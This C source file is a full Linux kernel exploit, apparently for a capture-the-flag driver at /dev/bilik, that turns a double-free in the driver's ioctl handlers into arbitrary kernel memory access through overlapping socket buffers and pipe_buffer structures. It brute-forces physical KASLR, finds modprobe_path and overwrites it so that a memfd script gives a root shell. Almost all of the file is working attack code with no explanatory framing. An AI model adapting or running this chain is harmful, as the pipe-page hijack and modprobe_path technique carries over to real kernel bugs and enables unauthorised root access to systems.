#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096
#define PIPE_SPRAY 128
#define PAGE_SHIFT 12
#define PHYSICAL_ALIGN 0x200000

#define SLAB 1024

#define SKBUF_HDR 320
#define SKBUF_SPRAY 128
#define MODPROBE_SCRIPT "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"

#define MASK 0xfffffffff0000000

#define BILIK_ADD 0xb45001
#define BILIK_DEL 0xb45002
#define BILIK_DUP 0xb45003

uint64_t vmemmap_base;

uint64_t virt_to_phys(uint64_t addr)
{
    return addr & 0x3fffffff;
}

long phys_to_page(long target_object)
{
    return vmemmap_base + (((target_object & 0xffffffff) >> 12) * 0x40);
}

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

int open_dev(void){
    int fd = open("/dev/bilik", O_RDWR);
    if(fd < 0){
        perror("[-] open dev");
    }
    return fd;
}

uint8_t isheap(uint64_t ptr)
{
    int high = ptr >> 44;
    if (high >= 0xffff8 && high < 0xfffff)
    {
        return 1;
    }
    return 0;
}

int add_(int fd, int cmd, char *buff)
{
    int ret;
    ret = ioctl(fd, cmd, (unsigned long)&buff);

    if(ret == -1){
        perror("ioctl(ADD):");    
        exit(EXIT_FAILURE);
    }else{
        puts("[+] add");
    }
}
int dup_(int fd, int cmd, char *buff)
{
    int ret;
    ret = ioctl(fd, cmd, (unsigned long)&buff);

    if(ret == -1){
        perror("ioctl(dup):");    
        exit(EXIT_FAILURE);
    }else{
        puts("[+] dup");
    }
}
int del_(int fd, int cmd, char *buff)
{
    int ret;
    ret = ioctl(fd, cmd, (unsigned long)&buff);

    if(ret == -1){
        perror("ioctl(del):");    
        exit(EXIT_FAILURE);
    }else{
        puts("[+] del");
    }
}

uint64_t bak_cs, bak_rflags, bak_ss, bak_rsp;

void save_state(){
	__asm__(
	".intel_syntax noprefix;"
        "mov bak_cs, cs;"
        "mov bak_ss, ss;"
        "mov bak_rsp, rsp;"
        "pushf;"
        "pop bak_rflags;"
        ".att_syntax;"		
	);
	puts("[+]Registers backed up");
}

/* Exploit */
void getshell(void){
    printf("[+] UID: %d\n", getuid());
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve("/bin/sh", argv, envp);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t *set = malloc(sizeof(cpu_set_t));

    CPU_ZERO(set);
    CPU_SET(cpu_n, set);

    if (sched_setaffinity(pid, sizeof(set), set) < 0)
    {
        perror("sched_setaffinity");
        return;
    }
    free(set);
}

bool check_modprobe(char *expected)
{
    char buf[32];
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
    {
        perror("[-] open(modprobe)");
    }
    read(fd, buf, 32);
    if (!strcmp(buf, expected))
    {
        close(fd);
        return true;
    }
    close(fd);
    return false;
}

static bool is_kernel_base(unsigned char *addr)
{
    // thanks lau :)

    // get-sig kernel_runtime_1
    if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
        memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
        return true;

    // get-sig kernel_runtime_2
    if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
        memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
        memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
        memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
        memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
        memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
        memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
        memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
        memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
        memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
        memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
        return true;

    return false;
}


bool trigger_modprobe(int status_fd)
{
    char *argv = NULL;
    int fd = memfd_create("", MFD_CLOEXEC);
    int status = 0;

    write(fd, "\xff\xff\xff\xff", 4);
    fexecve(fd, &argv, &argv);
    close(fd);

    read(status_fd, &status, 1);
    if (status)
    {
        return true;
    }
    return false;
}


int exploit(int argc, char **argv)
{

    // Setup I/O for shell
    int stdin_fd = dup(STDIN_FILENO);
    int stdout_fd = dup(STDOUT_FILENO);

    // Setup fake modprobe
    int modprobe_fd = memfd_create("", MFD_CLOEXEC);
    int status_fd = memfd_create("", 0);

    int sock[SKBUF_SPRAY][2];
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock[i]) < 0)
        {
            perror("[-] socketpair");
            return -1;
        }
    }

    int fd = open_dev();

    char buff[1024];
    char leak[1024];
    memset(&buff, 'A', 1024);

    add_(fd, BILIK_ADD, buff);
    del_(fd, BILIK_DEL, buff);

    puts("[*] skbuff spray....");
    uint8_t skbuf[SLAB - SKBUF_HDR];
    memset(&skbuf, 0x41, SLAB - SKBUF_HDR);
    for (int _ = 0; _ < SKBUF_SPRAY; _++)
    {
        if (write(sock[_][0], &skbuf, SLAB - SKBUF_HDR) < 0)
        {
            perror("[-] write(socket)");
        }
    }   

    puts("[*] trigger UAF"); 
    del_(fd, BILIK_DEL, buff);

    puts("[*] overlap with pipe for leak pipe->page");
    int fdflags;
    int pfd[PIPE_SPRAY][2];
    for (int i = 0; i < PIPE_SPRAY; i++){
        if (pipe(pfd[i])){
            perror("[-] pipe");
        }
        fdflags = fcntl(pfd[i][0], F_GETFL, 0);
        fcntl(pfd[i][0], F_SETFL, fdflags | O_NONBLOCK);
        fdflags = fcntl(pfd[i][1], F_GETFL, 0);
        fcntl(pfd[i][1], F_SETFL, fdflags | O_NONBLOCK);
    }
    for(int i = 0; i < PIPE_SPRAY; i++) {
        write(pfd[i][1], "pwn", 3);
    }

    // Read pipe_buffer skbuf
    uint8_t tmp[SLAB - SKBUF_HDR] = {0};
    for (int _ = 0; _ < SKBUF_SPRAY; _++)
    {
        if (read(sock[_][1], &tmp, SLAB - SKBUF_HDR) < 0)
        {
            perror("[-] read(socket)");
        }
        if (((uint64_t *)tmp)[0] != 0x4141414141414141){
            memcpy(&skbuf, &tmp, SLAB - SKBUF_HDR);
            puts("[+] Found pipe");
        }
    }

    struct pipe_buffer *pipe = (struct pipe_buffer *)&skbuf;
    vmemmap_base = pipe->page & MASK;
    puts("++++++++++++++++++++++++++++++++++++++++++++++++");
    printf("[+] pipe->page: 0x%lx\n", pipe->page);
    printf("[+] pipe->ops:  0x%lx\n", pipe->ops);
    printf("[+] vmemmap_base:  0x%lx\n", vmemmap_base);
    puts("++++++++++++++++++++++++++++++++++++++++++++++++");

    // Bruteforce phys-KASLR
    uint64_t kernel_base;
    bool found = false;
    uint8_t data[PAGE_SIZE] = {0};
    puts("[*] bruteforce phys-KASLR");

    for (uint64_t i = 0;; i++)
    {
        kernel_base = 0x40 * ((PHYSICAL_ALIGN * i) >> PAGE_SHIFT);
        pipe->page = vmemmap_base + kernel_base;
        pipe->offset = 0;
        pipe->len = PAGE_SIZE + 1;

        printf("\r[*] trying 0x%lx", pipe->page);

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipe, 1024 - 320) < 0)
            {
                perror("\n[-] write(socket)");
                return -1;
            }
        }

        for (int j = 0; j < PIPE_SPRAY; j++)
        {
            memset(&data, 0, PAGE_SIZE);
            int count;
            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
            {
                continue;
            }

            if (!memcmp(&data, "pwn", 3))
            {
                continue;
            }

            if (is_kernel_base(data))
            {
                found = true;
                break;
            }
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                perror("[-] read(socket)");
                return -1;
            }
        }

        if (found)
        {
            break;
        }
    }
    found = false;
    printf("\n[+] kernel base vmemmap offset: 0x%lx\n", kernel_base);

    // Scan kernel memory
    uint64_t modprobe_page, modprobe_off;
    uint32_t pipe_idx;
    uint64_t base_off = 0;
    puts("[*] scanning kernel memory");  

    for (uint64_t i = 0;; i++)
    {
        pipe->page = vmemmap_base + kernel_base + 0x40 * i;
        pipe->offset = 0;
        pipe->len = PAGE_SIZE + 1;

        if (!(i % 1000))
        {
            printf("\r[*] trying 0x%lx, %luMb", pipe->page, i * 4096 / 1024 / 1024);
        }
        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipe, 1024 - 320) < 0)
            {
                perror("\n[-] write(socket)");
                return -1;
            }
        }

        for (int j = 0; j < PIPE_SPRAY; j++)
        {
            memset(&data, 0, PAGE_SIZE);
            int count;
            if (count = read(pfd[j][0], &data, PAGE_SIZE) < 0)
            {
                continue;
            }

            if (!memcmp(&data, "pwn", 3))
            {
                continue;
            }

            void *locate = (uint64_t *)memmem(&data, PAGE_SIZE, "/sbin/modprobe", sizeof("/sbin/modprobe"));
            if (locate)
            {
                puts("\n[+] found modprobe_path");
                modprobe_page = pipe->page;
                modprobe_off = (uint8_t *)locate - data;
                printf("[*] modprobe page: 0x%lx\n", modprobe_page);
                printf("[*] modprobe offset: 0x%lx\n", modprobe_off);
                found = true;
                pipe_idx = j;
                break;
            }
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                perror("[-] read(socket)");
                return -1;
            }
        }

        if (found)
        {
            break;
        }
    }

    char fd_path[32] = {0};
    puts("[*] overwrite modprobe_path");
    for (int i = 0; i < 4194304; i++)
    {
        pipe->page = modprobe_page;
        pipe->offset = modprobe_off;
        pipe->len = 0;
        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (write(sock[i][0], pipe, 1024 - 320) < 0)
            {
                perror("[-] write(socket)");
                break;
            }
        }

        memset(&data, 0, PAGE_SIZE);
        snprintf(fd_path, sizeof(fd_path), "/proc/%i/fd/%i", i, modprobe_fd);

        lseek(modprobe_fd, 0, SEEK_SET);
        dprintf(modprobe_fd, MODPROBE_SCRIPT, i, status_fd, i, stdin_fd, i, stdout_fd);

        if (write(pfd[pipe_idx][1], fd_path, 32) < 0)
        {
            perror("\n[-] write(pipe)");
        }

        if (check_modprobe(fd_path))
        {
            puts("[-] failed to overwrite modprobe");
            break;
        }

        if (trigger_modprobe(status_fd))
        {
            puts("\n[+] got root");
            goto out;
        }

        for (int i = 0; i < SKBUF_SPRAY; i++)
        {
            if (read(sock[i][1], leak, 1024 - 320) < 0)
            {
                perror("[-] read(socket)");
                return -1;
            }
        }
    }
    puts("[-] fake modprobe failed");

out:
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (read(sock[i][1], tmp, 1024 - 320) < 0)
        {
            perror("[-] read(socket)");
            return -1;
        }
    }

    sleep(13371337);
    return 0;
}

int main(int argc, char *argv[])
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    srand(time(NULL));

    if (!fork())
    {
        unshare_setup(getuid(), getgid());
        set_cpu_affinity(0, 0);
        exploit(argc, argv);
    }

    while (1)
        sleep(1);
    return 0;    
}